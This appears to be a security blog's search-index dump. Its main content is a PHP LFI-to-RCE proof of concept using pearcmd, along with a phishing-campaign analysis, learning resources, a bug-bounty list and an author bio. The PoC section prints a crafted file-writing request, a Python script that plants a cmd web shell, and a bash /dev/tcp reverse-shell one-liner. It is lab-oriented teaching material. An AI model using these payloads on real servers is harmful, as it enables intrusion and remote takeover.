Following the post from @phithon_xg it is possible, from the index.php file, to invoke an action from pearcmd and cerate files. This ‚Äúpearcmd‚Äù is a PHP script that is used to interact with PEAR, a repository of PHP extensions and applications. It is used to install, uninstall, update, and manage PEAR packages. For this PoC, we will use the config-create function. pearcmd config-cerate config-cerate We can create the files in the terminal, or we can do something more interesting, which is, from the phpinfo.php file, from a crafted URL and execute this function. To test this action, I used Caido, a web security auditing toolkit similar to BurpSuite. In this request, the \u003c?=phpinfo()?\u003e function is placed inside the new PHP file: GET /index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/\u003c?=phpinfo()?\u003e+/tmp/h4ndsh.php HTTP/1.1 Host: 192.168.1.202:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close caido request Beffore / After The index.php file plays a crucial role in our testing. It was intentionally designed with a vulnerability inserted, allowing us to call the file we are injecting. In a real-world or Capture The Flag (CTF) environment, different methods may be needed to trigger the injected file. The screenshot shows the contents of index.php, highlighting the vulnerability. Now, we are prepared to test our command injection capabilities by opening index.php, which is designed to include any specified file. To do this, we provide the precise path to the file we want using the tool Caido, accessed via http://localhost:8080/index.php?file=/tmp/h4ndsh.php. If the injection works, the PHPinfo page should reappear, indicating success. In order to inject commands into the server effectively, I am planning to create a custom ‚Äòconsole‚Äô that is accessible via a URL. To streamline this process and eliminate the need for manual URL adjustments in a web browser or the use of tools like Burp Suite, I have chosen to utilize Python3. This decision allows for automation, making the testing process more efficient and controlled. import http.client import urllib host = \"192.168.1.202\" port = 8080 conn = http.client.HTTPConnection(host, port) # Create console cmd_shell = \"\u003c?=die(system($_GET['cmd']))?\u003e\" conn.request(\"GET\", f\"/index.php?+config-create+/\u0026file=/usr/local/lib/php/pearcmd.php\u0026/{cmd_shell}+/tmp/h4ndsh.php\") conn.close() URL: http://192.168.1.202:8080/index.php?file=/tmp/h4ndsh.php\u0026cmd=id Reverse Shell In a scenario where a server allows the injection of Unix commands, such as through vulnerabilities like Local File Inclusion (LFI) or Remote Code Execution (RCE), it becomes possible to send a specific command to establish a reverse shell. A reverse shell is a connection initiated from the compromised server to the attacker‚Äôs machine, providing the attacker with control over the server. To achieve this, I modified a previously used Python3 script to inject a command that opens a reverse shell on their own computer. For ease of use, the reverse shell command is encoded in base64, with the IP address ‚Äú192.168.1.110‚Äù and port ‚Äú2030‚Äù specified as the connection destination. echo 'bash -c \"sh -i \u003e\u0026 /dev/tcp/192.168.1.110/2030 0\u003e\u00261\"' | base64 -w 0 Add the new code to the existing code, replacing \u003cbase64\u003e with the set of characters generated by the base64 command. # inject the command conn = http.client.HTTPConnection(host","date":"Oct 12, 2023","objectID":"/2023/phpinfo/:4:0","tags":["php7","phpinfo"],"title":"PHP \u003c= 7.3 Local File Inclusion with RCE (PoC)","uri":"/2023/phpinfo/"},{"categories":["Phishing"],"content":"This article is about a phishing campaign that I found in the wild. The phishing campaign was targeting Saphety, a Portuguese company that provides electronic invoicing services.","date":"Jun 29, 2023","objectID":"/2023/saphety/","tags":["Ethical Hacking","Phishing","Saphety"],"title":"Saphety Phishing Campaign","uri":"/2023/saphety/"},{"categories":["Phishing"],"content":"This article is about a phishing campaign that my company received. The campaign targeted Saphety, a Portuguese company providing electronic invoicing services. When my enterprise received the phishing email, I decided to investigate further. In this article, I will share my findings. Summary Summary What is Saphety? The phishing email Website analysis Decoding the encoded strings Form analysis POST method analysis Server analysis What is Saphety? Saphety is a Portuguese company that offers electronic invoicing services. It serves a wide range of clients, including some of the largest companies in Portugal, as well as clients in other countries such as Spain, France, and Brazil. The phishing email The phishing email was sent from the email address info@cabinetconstruction.com with the subject line: ‚ÄúCristina Campos sent you an electronic document.‚Äù The email body contained the following message: Email Body The email impersonated Saphety, and it also included a link to a phishing website. I will not share the link here, as it has likely been taken down. However, I will provide some screenshots of the phishing website. Website analysis The phishing website was hosted on Cloudflare and utilized a valid SSL certificate. It was hosted on the domain cf-ipfs.com, which was registered on 2018-12-05. ","date":"Jun 29, 2023","objectID":"/2023/saphety/:0:0","tags":["Ethical Hacking","Phishing","Saphety"],"title":"Saphety Phishing Campaign","uri":"/2023/saphety/"},{"categories":["Phishing"],"content":"Decoding the encoded strings Upon examining the phishing website‚Äôs code, I discovered that it was encoded using the escape function, an old JavaScript method used to encode strings. The website also employed various JavaScript obfuscation techniques, such as utilizing random variable names and splitting the code into multiple lines. The following screenshot shows the encoded strings. Html Script To decode the encoded strings, I used the unescape function and printed the decoded strings to the console. This allowed me to understand the actions performed by the website. ","date":"Jun 29, 2023","objectID":"/2023/saphety/:1:0","tags":["Ethical Hacking","Phishing","Saphety"],"title":"Saphety Phishing Campaign","uri":"/2023/saphety/"},{"categories":["Phishing"],"content":"Form analysis The phishing website employed a form to collect data and send it to the hacker‚Äôs domain. The form used by the hackers was similar to those I have encountered in previous phishing websites. The form was designed to mimic the victim‚Äôs domain and generate fake webmail login pages. In the background, the phishing website loaded the main phishing page from the victim‚Äôs domain, with the victim‚Äôs domain name being used to generate the fake webmail login pages. Form Thus far, there was nothing particularly distinct about this phishing website compared to others I have encountered in the past. I needed to dig deeper to understand its full operation. Where was the data being sent? What was the phishing website doing with the data? The answers to these questions lay within the POST method. ","date":"Jun 29, 2023","objectID":"/2023/saphety/:2:0","tags":["Ethical Hacking","Phishing","Saphety"],"title":"Saphety Phishing Campaign","uri":"/2023/saphety/"},{"categories":["Phishing"],"content":"POST method analysis To uncover the actions of the phishing website, I needed to determine where the data was being sent. For that purpose, I searched for the POST method in the phishing website‚Äôs code. POST As seen in the screenshot, the POST method was used to send the data to the hacker‚Äôs domain in JSON format via the cp.php file. My curiosity was piqued by the cp.php file, so I decided to investigate it further, and what I found was quite interesting. ","date":"Jun 29, 2023","objectID":"/2023/saphety/:3:0","tags":["Ethical Hacking","Phishing","Saphety"],"title":"Saphety Phishing Campaign","uri":"/2023/saphety/"},{"categories":["Phishing"],"content":"Server analysis As you may know, we are unable to access the server code directly. However, we can try to view directories and files that are not protected by the server. In this case, the hacker‚Äôs server was not properly protected, allowing me to view the directories and files hosted on it. It was there that I stumbled upon some intriguing directories and files. First Directory First Directory One file, in particular, caught my attention: ahmed.txt. I decided to open it and see its contents, and to my surprise, I discovered a multitude of email addresses and passwords. I was reluctant to believe that the credentials were being stored in a plain text file. To confirm my suspicions, I conducted a test POST request to see if the credentials were indeed being saved in the text file, and unfortunately, they were. POST Request Test Clear and simple. The inevitable had occurred. I had access to the victims‚Äô credentials, numerous credentials in fact. I promptly reported the phishing website to Cloudflare and the victim company. At the time of writing this article, the phishing website had been reported as such. Reported Message That concludes this article. I hope you found it informative. Happy Researching! üòÑ ","date":"Jun 29, 2023","objectID":"/2023/saphety/:4:0","tags":["Ethical Hacking","Phishing","Saphety"],"title":"Saphety Phishing Campaign","uri":"/2023/saphety/"},{"categories":["Learning"],"content":"Since I started my journey in the world of cybersecurity, I've been learning and improving my skills in this area. I've been asked a lot of times about the resources I used to learn ethical hacking, so I decided to create this post to share with you the resources I used to learn ethical hacking.","date":"Jun 7, 2023","objectID":"/2023/myresources/","tags":["Ethical Hacking","Resources"],"title":"My resources to learn Ethical Hacking","uri":"/2023/myresources/"},{"categories":["Learning"],"content":"Since I started my journey in the world of cybersecurity, I‚Äôve been learning and improving my skills in this area. I‚Äôve been asked a lot of times about the resources I used to learn ethical hacking, so I decided to create this post to share with you the resources I used to learn ethical hacking. Summary Summary How to start? Where to learn? CTFs Blogs Github repositories Tools Being up to date How to start? The answer to this question is simple: you just need to start. I know that it is not easy to start learning ethical hacking because there are a lot of topics to learn, but you just need to start. You don‚Äôt need to know everything to start learning ethical hacking; you just need to know the basics of the following topics: Networking Linux Programming Web development Databases In my case, I graduated in Computer Science, so I already had a good knowledge of these topics. It is not necessary to have a degree in Computer Science to learn ethical hacking; you just need to have the interest and the motivation to learn. Where to learn? Some popular resources for learning ethical hacking include online courses, tutorials, forums, and practice platforms. Online courses, such as those offered by Udemy, Coursera, and Pluralsight, provide structured learning paths and in-depth knowledge on various aspects of ethical hacking. These courses often include video lectures, quizzes, and hands-on exercises to help reinforce the concepts. Additionally, there are numerous tutorials available on websites and YouTube channels dedicated to ethical hacking. These tutorials cover a wide range of topics, from basic concepts to advanced techniques. They often provide step-by-step instructions and demonstrations, making it easier for learners to follow along and understand the practical aspects of ethical hacking. Forums and online communities focused on cybersecurity and ethical hacking, such as Reddit‚Äôs r/Netsec and Hack Forums, serve as valuable resources for learning. These platforms allow individuals to ask questions, share knowledge, and engage in discussions with like-minded individuals. Participating in these communities can provide insights into real-world challenges and solutions, as well as networking opportunities with professionals in the field. To gain hands-on experience and practice ethical hacking techniques, Capture the Flag (CTF) challenges are widely used. CTFs simulate real-world scenarios and require participants to find vulnerabilities, exploit systems, and solve various security challenges. Several online platforms, such as Hack The Box, TryHackMe, and OverTheWire, offer CTF challenges of varying difficulty levels. These platforms provide a safe and legal environment for individuals to sharpen their hacking skills and learn new techniques. Books also play an important role in learning ethical hacking, as they often provide comprehensive coverage of the subject matter. Some popular books in the field include ‚ÄúThe Web Application Hacker‚Äôs Handbook‚Äù by Dafydd Stuttard and Marcus Pinto, ‚ÄúMetasploit: The Penetration Tester‚Äôs Guide‚Äù by David Kennedy, Jim O‚ÄôGorman, Devon Kearns, and Mati Aharoni, and ‚ÄúHacking: The Art of Exploitation‚Äù by Jon Erickson. These books delve into the technical aspects of ethical hacking, explaining concepts, tools, and methodologies in detail. Ultimately, the best approach to learning ethical hacking is often a combination of different resources. By exploring a variety of mediums, individuals can benefit from different teaching styles and gain a well-rounded understanding of the subject. It is essential to adapt the learning process to personal preferences and learning styles, allowing for a more engaging and effective educational experience. ","date":"Jun 7, 2023","objectID":"/2023/myresources/:0:0","tags":["Ethical Hacking","Resources"],"title":"My resources to learn Ethical Hacking","uri":"/2023/myresources/"},{"categories":["Learning"],"content":"CTFs In addition to the three common types of Capture the Flag (CTF) competitions mentioned‚ÄîJeopardy, Attack-Defence, and mixed‚Äîthere are some key characteristics and considerations for each type. Jeopardy-style CTFs are often popular because they encompass a wide range of categories, allowing participants to showcase their skills in various areas of information security. These categories can include web security, forensics, cryptography, binary exploitation, reverse engineering, network security, and more. Each task within a category typically has a specific point value associated with it, with more complex tasks offering higher points. Participants solve these tasks independently or as a team, and the points earned contribute to their overall score. Jeopardy-style CTFs often require a combination of technical knowledge, analytical thinking, and problem-solving skills. Attack-Defence CTFs offer a different dynamic. Each team has their own network or host with vulnerable services. The objective is to secure your own services while attempting to exploit and capture flags from the opposing teams. Flags are typically hidden within the services, and capturing a flag from an opponent‚Äôs service earns points for the capturing team. However, opponents can patch their services to prevent further exploitation. This type of CTF requires both offensive and defensive skills, as participants must continuously monitor and protect their own services while actively seeking vulnerabilities in the opponent‚Äôs services. Mixed CTFs combine elements from both Jeopardy-style and Attack-Defence competitions. They include a mix of tasks from different categories, similar to Jeopardy-style CTFs, but may also incorporate elements of network exploitation and defense. This hybrid format allows participants to demonstrate their proficiency in various areas, ranging from solving challenging puzzles to exploiting vulnerable systems. CTFs provide an engaging and competitive environment for individuals and teams to showcase their technical skills, creativity, and problem-solving abilities. They simulate real-world scenarios, enabling participants to gain hands-on experience and exposure to various challenges they may encounter in the field of information security. This is a list of CTF platforms that I recommend you to try: TryHackMe HackTheBox PicoCTF OverTheWire Root-Me VulnHub This is a great article about CTFs: CTF Field Guide. You also can read other articles about CTFs like this ","date":"Jun 7, 2023","objectID":"/2023/myresources/:1:0","tags":["Ethical Hacking","Resources"],"title":"My resources to learn Ethical Hacking","uri":"/2023/myresources/"},{"categories":["Learning"],"content":"Blogs My favorite learning method is by reading blog posts and testing the things. In most scenarios, I read a blog post, and then I try to reproduce the things that I learned. Here are some blogs that I recommend you read: exploit-notes swisskyrepo viperone HackTricks 0x00sec 7h3w4lk3rs-organization I found a repository on GitHub with a lot of bookmarks related to cybersecurity. You can find it here. Other blog posts that I recommend you read are 0x00sec‚Äôs Tricks of the trade from 5 years in offensive cyber security and Ropnop‚Äôs Docker for pentesters. ","date":"Jun 7, 2023","objectID":"/2023/myresources/:2:0","tags":["Ethical Hacking","Resources"],"title":"My resources to learn Ethical Hacking","uri":"/2023/myresources/"},{"categories":["Learning"],"content":"Github repositories GitHub is a great place to find resources to learn ethical hacking. In my GitHub account, I have a lot of repositories with resources to learn ethical hacking. You can find them here. Stars in my github account Tools There are a lot of tools to learn ethical hacking and to do pentesting. Here are some tools that you can start with: offsec tools Being up to date The world of cybersecurity is constantly changing, so it‚Äôs important to be up to date. If you are interested in cybersecurity, I recommend you follow some cybersecurity accounts on Twitter and read some cybersecurity news websites. It is also important to read the CVEs (Common Vulnerabilities and Exposures) to know the latest vulnerabilities that are being discovered. Above all, it is important to practice and be curious because the best way to learn is by doing it. CVEs cvetrends zerodayinitiative Happy hacking! üòÑ ","date":"Jun 7, 2023","objectID":"/2023/myresources/:3:0","tags":["Ethical Hacking","Resources"],"title":"My resources to learn Ethical Hacking","uri":"/2023/myresources/"},{"categories":null,"content":"Bug Bounty","date":"Feb 21, 2024","objectID":"/vuln/","tags":null,"title":"Vulnerabilities Discovered and Reported","uri":"/vuln/"},{"categories":null,"content":" entity vulnerability Year Severity Logicpulse LFI 2024 CRITICAL Logicpulse SQL Injection 2024 CRITICAL AIRC Reflected XSS 2024 MEDIUM Enso Origins RCE 2024 Critical Enso Origins Blind XSS 2024 Medium AIRC Clickjacking 2024 high ANMP Email Exposure 2023 CRITICAL FEFAL Storaged XSS 2023 high FEFAL Exposed web configs 2023 CRITICAL FEFAL Reflected XSS 2023 MEDIUM FEFAL Directory Listing 2023 Low FEFAL Unrestricted File Upload 2023 high FEFAL Sensitive Data Exposure 2023 high FEFAL IDOR 2023 critical ","date":"Feb 21, 2024","objectID":"/vuln/:0:0","tags":null,"title":"Vulnerabilities Discovered and Reported","uri":"/vuln/"},{"categories":null,"content":"Who am I?","date":"Aug 2, 2019","objectID":"/about/","tags":null,"title":"Who am I?","uri":"/about/"},{"categories":null,"content":"About Me Hi there, I‚Äôm Diogo Costa - h4ndsh - an ethical hacker with a passion for securing web services. In 2016 I started my journey in the world of cybersecurity and since then I‚Äôve been learning and improving my skills in this area. I‚Äôm currently working as a Security Engineer at FEFAL, a company that provides services to municipalities in Portugal. Work experience Security Engineer @ FEFAL [ September 2022 - Present ] Freelancer @ Fiverr [ August 2020 - Jully 2022 ] Education Computer Science and engineering - Instituto Superior de Engenharia de Coimbra [2018 - 2022] Computer Systems Programming - Escola Secund√°ria Avelar Brotero [2015 - 2018] Skills Scripting: Python, Bash, JavaScript Red Teaming: Web Application Penetration Testing, Network Penetration Testing, API Penetration Testing Blue Teaming: SIEM, IDS/IPS, Vulnerability Management, Threat Intelligence DevOps: Docker, Git, Proxmox OS: Linux, Windows Languages: Portuguese, English ","date":"Aug 2, 2019","objectID":"/about/:0:0","tags":null,"title":"Who am I?","uri":"/about/"}]